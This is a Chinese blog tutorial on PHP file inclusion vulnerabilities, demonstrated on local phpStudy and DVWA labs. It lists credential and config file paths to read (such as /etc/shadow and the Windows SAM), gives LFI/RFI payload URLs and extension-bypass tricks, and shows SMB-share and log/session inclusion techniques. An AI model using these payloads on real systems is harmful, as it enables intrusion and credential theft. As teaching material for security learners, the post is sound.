{"blogid": "126040612", "writerAge": "码龄1年", "writerBlogNum": "22", "writerCollect": "738", "writerComment": "1104", "writerFan": "906", "writerGrade": "5级", "writerIntegral": "2433", "writerName": "摆烂阳", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_126040612.jpg", "writerRankTotal": "8151", "writerRankWeekly": "88", "writerThumb": "830", "writerVisitNum": "29796", "blog_read_count": "3120", "blog_time": "已于 2022-07-29 18:28:15 修改", "blog_title": "【web渗透】文件包含漏洞入门级超详细讲解", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<blockquote>\n<p>💕💕💕 博主昵称：摆烂阳💕💕💕<br/> 🥰<a href=\"https://blog.csdn.net/qinshuoyang1?type=blog\">博主主页链接https://blog.csdn.net/qinshuoyang1?type=blog</a> 👩‍💻<br/> 博主研究方向：web渗透测试<br/> 📃 博主寄语：希望本篇文章能给大家带来帮助，有不足的地方，希望友友们给予指导</p>\n</blockquote>\n<p>————————————————</p>\n<p></p>\n<div class=\"toc\">\n<h3>目录</h3>\n<ul><li><a href=\"#_15\">前言</a></li><li><a href=\"#_18\">一、原理</a></li><li><a href=\"#_26\">二、文件包含的分类</a></li><li><ul><li><a href=\"#1_27\">1、本地文件包含</a></li><li><a href=\"#2_31\">2、远程文件包含</a></li></ul>\n</li><li><a href=\"#_40\">三、常见的文件包含函数</a></li><li><a href=\"#_91\">四、无限制本地文件包含漏洞</a></li><li><ul><li><a href=\"#1_93\">1、原理</a></li><li><a href=\"#2_97\">2、常见的敏感信息路径</a></li><li><ul><li><a href=\"#1Windows_98\">(1).Windows</a></li><li><a href=\"#2LinuxUnix_120\">(2).Linux/Unix</a></li></ul>\n</li></ul>\n</li><li><a href=\"#_169\">五、有限制文件包含</a></li><li><ul><li><a href=\"#1_170\">1、前言</a></li><li><a href=\"#2_181\">2、本地限制绕过</a></li><li><ul><li><a href=\"#1_182\">（1）、路径长度截断</a></li><li><a href=\"#200_195\">（2）、00截断</a></li></ul>\n</li><li><a href=\"#3_207\">3、远程限制绕过</a></li><li><ul><li><a href=\"#1_209\">(1)、？绕过</a></li><li><a href=\"#223_212\">(2)、#（%23）绕过</a></li><li><a href=\"#3samba_215\">(3)、samba绕过</a></li></ul>\n</li></ul>\n</li><li><a href=\"#_245\">六、日志包含</a></li><li><ul><li><a href=\"#1_247\">1、简介</a></li><li><a href=\"#2_250\">2、利用条件</a></li></ul>\n</li><li><a href=\"#session_267\">七、session包含</a></li><li><ul><li><a href=\"#1_268\">1、前言</a></li><li><a href=\"#2_272\">2、利用条件</a></li><li><a href=\"#3_289\">3、实际利用</a></li></ul>\n</li><li><a href=\"#_304\">八、总结</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"_15\"></a>前言</h1>\n<p>在程序员开发过程中，通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需在此编写，这种调用文件的过程一般被称为文件包含。</p>\n<h1><a id=\"_18\"></a>一、原理</h1>\n<p>随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校检或者校检被绕过就造成了文件包含漏洞。</p>\n<p><a href=\"https://www.xp.cn/\">附赠：phpstudy2018版本下载链接</a></p>\n<h1><a id=\"_26\"></a>二、文件包含的分类</h1>\n<h2><a id=\"1_27\"></a>1、本地文件包含</h2>\n<blockquote>\n<p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。</p>\n</blockquote>\n<h2><a id=\"2_31\"></a>2、远程文件包含</h2>\n<blockquote>\n<p>原理和本地文件包含类似，差别在于是通过第三方服务器的文件来进行包含。</p>\n</blockquote>\n<p>ps:需要满足以下两个配置文件</p>\n<pre><code>1、在php.ini中allow_url_fopen为ON\n2、在php.ini中allow_url_include为ON\n</code></pre>\n<h1><a id=\"_40\"></a>三、常见的文件包含函数</h1>\n<p>1、include()</p>\n<blockquote>\n<p>当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时之给出一个警告，然后继续向下执行。</p>\n</blockquote>\n<p>2、include_once()</p>\n<blockquote>\n<p>功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次</p>\n</blockquote>\n<p>3、 require()</p>\n<blockquote>\n<p>Require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。</p>\n</blockquote>\n<p>4、require_once()</p>\n<blockquote>\n<p>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>\n</blockquote>\n<p>5、highlight_file()、show_source()</p>\n<blockquote>\n<p>函数对文件进行语法高亮显示，通常能看到源代码</p>\n</blockquote>\n<p>6、readfile()、file_get_contents()、</p>\n<blockquote>\n<p>函数读取一个文件，并写入到输出缓冲</p>\n</blockquote>\n<p>7、fopen()</p>\n<blockquote>\n<p>打开一个文件或者url</p>\n</blockquote>\n<p><strong>漏洞代码示例：</strong></p>\n<pre><code>&lt;?php\n   $filename  = $_GET['file'];\n   include($file); \n?&gt;\n</code></pre>\n<blockquote>\n<p>以上代码，对$_GET[‘file’]参数没有经过严格的过滤，直接带入了include()函数，攻击者可以修改file的值，加载其他文件，执行非预期的操作，由此造成了文件包含漏洞；</p>\n</blockquote>\n<p>我们在后面加上我们当前目录的文件1.txt 即可读取1.txt的内容显示出来</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e35b5a9961bf4b3a8031825c897afe3a.png\"/></p>\n<p>ps:</p>\n<blockquote>\n<p>几乎所有的语言中都提供文件包含的功能，但文件包含漏洞在PHP中居多，而在JSP\\ASP\\ASP.NET程序中非常少，甚至没有文件包含漏洞的存在。</p>\n</blockquote>\n<h1><a id=\"_91\"></a>四、无限制本地文件包含漏洞</h1>\n<h2><a id=\"1_93\"></a>1、原理</h2>\n<blockquote>\n<p>无限制本地文件包含漏洞是指代码中没有为包含文件制定特定前缀或者.php、.html等扩展名，因此攻击者可以利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息，或者执行其他文件中的代码</p>\n</blockquote>\n<h2><a id=\"2_97\"></a>2、常见的敏感信息路径</h2>\n<h3><a id=\"1Windows_98\"></a>(1).Windows</h3>\n<p>查看系统版本</p>\n<blockquote>\n<p>c:\\boot.ini</p>\n</blockquote>\n<p>Apache配置信息</p>\n<blockquote>\n<p>c:\\XX\\httpd.conf</p>\n</blockquote>\n<p>IIS配置文件</p>\n<blockquote>\n<p>c:\\windows\\system32\\inetsrv\\MetaBase.xml</p>\n</blockquote>\n<p>存储Windows系统初次安装的密码</p>\n<blockquote>\n<p>c:\\windows\\repair\\sam</p>\n</blockquote>\n<p>MySQL配置</p>\n<blockquote>\n<p>c:\\ProgramFiles\\mysql\\my.ini</p>\n</blockquote>\n<p>MySQL root密码</p>\n<blockquote>\n<p>c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD /</p>\n</blockquote>\n<p>php 配置信息</p>\n<blockquote>\n<p>c:\\windows\\php.ini</p>\n</blockquote>\n<h3><a id=\"2LinuxUnix_120\"></a>(2).Linux/Unix</h3>\n<p>账户信息</p>\n<blockquote>\n<p>/etc/passwd</p>\n</blockquote>\n<p>账户密码文件</p>\n<blockquote>\n<p>/etc/shadow</p>\n</blockquote>\n<p>Apache配置文件</p>\n<blockquote>\n<p>/etc/httpd/conf/httpd.conf</p>\n</blockquote>\n<p>mysql 配置文件</p>\n<blockquote>\n<p>/etc/my.conf</p>\n</blockquote>\n<p>Apache2默认配置文件</p>\n<blockquote>\n<p>/usr/local/app/apache2/conf/httpd.conf</p>\n</blockquote>\n<p>虚拟网站配置</p>\n<blockquote>\n<p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf</p>\n</blockquote>\n<p>PHP相关配置</p>\n<blockquote>\n<p>/usr/local/app/php5/lib/php.ini</p>\n</blockquote>\n<p><strong>无限制本地文件包含漏洞示例:</strong></p>\n<pre><code>&lt;?php\n      $filename  = $_GET['filename'];\n      include($filename);\n?&gt;\n</code></pre>\n<p>利用漏洞读取Mysql配置信息</p>\n<p>payload:</p>\n<pre><code>http://127.0.0.1/test.php?filename=C:\\phpStudy\\PHPTutorial\\MySQL\\my.ini\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\72a754dabef84d2f96ac467ff65b7bdb.png\"/></p>\n<p>利用无限制本地包含漏洞执行代码</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a5bd75633e27432c9785f3e12806aa9a.png\"/></p>\n<h1><a id=\"_169\"></a>五、有限制文件包含</h1>\n<h2><a id=\"1_170\"></a>1、前言</h2>\n<blockquote>\n<p>有限制本地文件包含漏洞是指代码中为包含文件制定了特定的前缀或者.php、.html等扩展名，攻击者需要绕过前缀或者扩展名过滤，才能利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息。常见的有限制本地文件包含过滤绕过的方式主要:有%00截断文件包含、路径长度截断文件包含、点号截断文件包含这三种</p>\n</blockquote>\n<p><strong>测试代码：</strong></p>\n<pre><code>&lt;?php\n      $filename  = $_GET['filename'];\n      include($filename,\".html\");\n?&gt;\n</code></pre>\n<h2><a id=\"2_181\"></a>2、本地限制绕过</h2>\n<h3><a id=\"1_182\"></a>（1）、路径长度截断</h3>\n<p>条件：</p>\n<blockquote>\n<p>在 windows系统中，文件后缀最大长度256字节，在Linux中最大长度是 4096字节 ， 超出的部分会被丢弃</p>\n</blockquote>\n<p>绕过方式：</p>\n<blockquote>\n<p>…或者/./.</p>\n</blockquote>\n<p><img alt=\"\" src=\"..\\..\\static\\image\\13fb08d417644059b521b5a09201deca.png\"/></p>\n<h3><a id=\"200_195\"></a>（2）、00截断</h3>\n<p>%00是结束符，后面的数据会被直接忽略，导致扩展名截断。攻击者可以利用这个漏洞绕过扩展名过滤</p>\n<p><strong>漏洞利用条件:</strong></p>\n<pre><code>(1)    magic_quotes_gpc=off\n\n(2)    PHP&lt;5.3.4\n</code></pre>\n<p><strong>实操：</strong><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\bed7a46fb6c245888f195ff4c7f8ac20.png\"/></p>\n<h2><a id=\"3_207\"></a>3、远程限制绕过</h2>\n<h3><a id=\"1_209\"></a>(1)、？绕过</h3>\n<blockquote>\n<p>http://127.0.0.1/test.php?file=http://ip/phpinfo.txt?</p>\n</blockquote>\n<h3><a id=\"223_212\"></a>(2)、#（%23）绕过</h3>\n<p>http://127.0.0.1/test.php?file=http://ip/phpinfo.txt%23(#)</p>\n<h3><a id=\"3samba_215\"></a>(3)、samba绕过</h3>\n<p><strong>简介：</strong></p>\n<blockquote>\n<p>SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。</p>\n</blockquote>\n<p><strong>攻击场景概述：</strong></p>\n<blockquote>\n<p>当易受攻击的PHP应用程序代码尝试从受攻击者控制的SMB共享加载PHP Webshell时，SMB共享应允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的SMB服务器。因此，一旦易受攻击的应用程序尝试从SMB共享访问PHPWeb shell，SMB服务器将不会要求任何的凭据，易受攻击的应用程序将包含Web shell的PHP代码。</p>\n</blockquote>\n<p><strong>实操：</strong></p>\n<p>首先，我重新配置了PHP环境，并在php.in i文件中禁用了“allow-url-fopen”和“allow-url-include”。之后，配置了具有匿名浏览访问的SMB服务器。一旦SMB共享准备就绪，我们就可以利用易受攻击的应用程序了。</p>\n<p>先在虚拟机中打开kali，并创建一个共享文件夹，在该文件夹中添加获取phpinfo代码</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\1efca05060da48459b6c8e21cf134e48.png\"/><br/> 附赠配置文件</p>\n<blockquote>\n<p>[global] workgroup = WORKGROUP<br/> server string = Samba Server %v<br/> netbios name = indishell-lab<br/> security = user map to guest = bad user<br/> name resolve order = bcast host<br/> dns proxy = no bind interfaces only =<br/> yes [ica] path = /var/www/html/pub<br/> writable = no guest ok = yes guest<br/> only = yes read<br/> only = yes<br/> directory mode = 0555</p>\n</blockquote>\n<h1><a id=\"_245\"></a>六、日志包含</h1>\n<h2><a id=\"1_247\"></a>1、简介</h2>\n<blockquote>\n<p>日志文件是用于记录系统操作事件的记录文件或文件集合，可分为事件日志和消息日志。具有处理历史数据、诊断问题的追踪以及理解系统的活动等重要作用。</p>\n</blockquote>\n<h2><a id=\"2_250\"></a>2、利用条件</h2>\n<p><strong>知道日志文件的存储路径，并且日志文件可读</strong></p>\n<p>(1)、apache的日志文件可以通过phpinfo()页面来查询，apache2hander中的server root 就是apache的安装路径，那么日志文件应该就是在这个路径下的logs目录中<br/> (2)、或者通过猜测常见日志文件的路径/usr/local/apache/logs/error_log or access_log ，或者一些默认存储路径。<br/> (3)、也可以通过包含配置文件来确定日志文件路径<br/> Index.php?file=/etc/init.d/httpd<br/> Index.php?file=/etc/httpd/conf/httpd.conf</p>\n<p>首先利用burp抓包修改上传名称<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e8e5bb87b79e4e8cbbf6515670602fea.png\"/><br/> 跟着找到访问的cookie名称，然后包含日志文件的绝对路径<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\909ccbe977264a2698f6bd0786f29f1f.png\"/><br/> <strong>日志默认存放路径：</strong></p>\n<blockquote>\n<p>apache/logs/error.log或access.log</p>\n</blockquote>\n<h1><a id=\"session_267\"></a>七、session包含</h1>\n<h2><a id=\"1_268\"></a>1、前言</h2>\n<blockquote>\n<p>Session就是保存在服务器的文本文件。 默认情况下，PHP.ini 中设置的 SESSION 保存方式是files（session.save_handler = files），即使用读写文件的方式保存 SESSION 数据，而 SESSION文件保存的目录由 session.save_path 指定，文件名以 sess_ 为前缀，后跟 SESSIONID，如：sess_c72665af28a8b14c0fe11afe3b59b51b。文件中的数据即是序列化之后的 SESSION 数据了</p>\n</blockquote>\n<h2><a id=\"2_272\"></a>2、利用条件</h2>\n<p>1、session文件路径已知</p>\n<blockquote>\n<p>session路径位置可以通过phpinfo页面来获取，</p>\n</blockquote>\n<blockquote>\n<p>session.save_path为/var/lib/php/session.</p>\n</blockquote>\n<blockquote>\n<p>通过猜测默认的session的存放位置进行尝试</p>\n</blockquote>\n<blockquote>\n<p>Phpstudy默认session的存储路径为E:\\phpStudy\\PHPTutorial\\tmp\\tmp</p>\n</blockquote>\n<p>2、且其中部分内容可控制</p>\n<blockquote>\n<p>在默认的session的文件中，username后面的就是账号，那么能把这个账号控制变化那么就可以利用session包含。</p>\n</blockquote>\n<h2><a id=\"3_289\"></a>3、实际利用</h2>\n<p>本次实验使用DVWA靶场<br/> DVWA这个靶场是不满足条件，因为他的session是不可控的。那么我们可以添加一串代码来让他可控。<br/> <strong>代码如下：</strong></p>\n<pre><code>&lt;?php\n     session_start();\n     $ctfs=$_GET['ctfs'];\n     $_SESSION[\"username\"]=$ctfs;\n?&gt;\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ff2a289213614e86ae6a0a06bb0a25e8.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\9c42d2e779184a5fa2d90ed129234cd3.png\"/></p>\n<h1><a id=\"_304\"></a>八、总结</h1>\n<p>本篇文章耗费三个小时，可谓是呕心沥血，希望可以给大家带来帮助；另外警惕大家，网络并非法外之地，大家要谨遵网络安全法，不做违纪违规的事情！</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 1, "php": 1, "time": "2022-07-29 18:28:15", "summary": "博主昵称：摆烂阳博主主页链接博主研究方向：渗透测试博主寄语：希望本篇文章能给大家带来帮助，有不足的地方，希望友友们给予指导目录前言一、原理二、文件包含的分类、本地文件包含、远程文件包含三、常见的文件包"}